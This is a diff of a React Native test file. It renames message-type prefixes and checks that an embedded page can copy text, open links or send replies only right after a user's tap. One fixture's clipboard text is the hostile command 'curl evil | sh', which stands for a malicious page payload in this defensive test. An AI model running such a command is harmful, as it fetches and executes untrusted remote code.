@@ -54,7 +54,7 @@ vi.mock("expo-router", () => ({
   }),
 }));
 vi.mock("react-native-safe-area-context", () => ({ useSafeAreaInsets: () => ({ top: 0 }) }));
-vi.mock("@rakazo/chat-ui/native", () => ({
+vi.mock("@robots/chat-ui/native", () => ({
   useNativeLinkConfirm: () => (url: string) => host.opened.push(url),
 }));
 vi.mock("../components/native-symbol", () => ({ NativeSymbol: () => null }));
@@ -125,8 +125,8 @@ it("copies and opens links for a page only right after the person tapped it", as
     });
   const touch = (name: string, x: number, y: number, fingers?: number) =>
     host.touch[name]?.(at(x, y, fingers));
-  const copy = { type: "rakazo-page:copy", id: "a", text: "curl evil | sh" };
-  const link = { type: "rakazo-page:open-link", url: "https://example.com/x" };
+  const copy = { type: "robots-page:copy", id: "a", text: "curl evil | sh" };
+  const link = { type: "robots-page:open-link", url: "https://example.com/x" };
   const attempt = async () => {
     await send(copy);
     await send(link);
@@ -187,7 +187,7 @@ it("does not let a page that reloads right after a tap act on that tap", async (
   await act(async () => root.render(createElement(PageScreen)));
   const copy = () =>
     act(async () => {
-      host.message?.(JSON.stringify({ type: "rakazo-page:copy", id: "a", text: "x" }), () => {});
+      host.message?.(JSON.stringify({ type: "robots-page:copy", id: "a", text: "x" }), () => {});
       await new Promise((resolve) => setTimeout(resolve, 0));
     });
   host.touch.onTouchStart?.(at(10, 10));
@@ -218,7 +218,7 @@ it("puts a tapped reply in the page's own chat unsent, closing the page or openi
     host.touch.onTouchEnd?.(at(50, 50));
     now.mockReturnValue(2_000_000 + delay);
     await act(async () =>
-      host.message?.(JSON.stringify({ type: "rakazo-page:reply", text }), () => {}),
+      host.message?.(JSON.stringify({ type: "robots-page:reply", text }), () => {}),
     );
     now.mockReturnValue(2_000_000);
   };
@@ -229,7 +229,7 @@ it("puts a tapped reply in the page's own chat unsent, closing the page or openi
   let root = await show();
   expect(host.html).toContain('{"reply":true}');
   await act(async () =>
-    host.message?.(JSON.stringify({ type: "rakazo-page:reply", text: "B" }), () => {}),
+    host.message?.(JSON.stringify({ type: "robots-page:reply", text: "B" }), () => {}),
   );
   await tapThenReply("Pick  option\n B", 1_200);
   expect([host.went, takePageReply("bot-1")]).toEqual([[], null]);
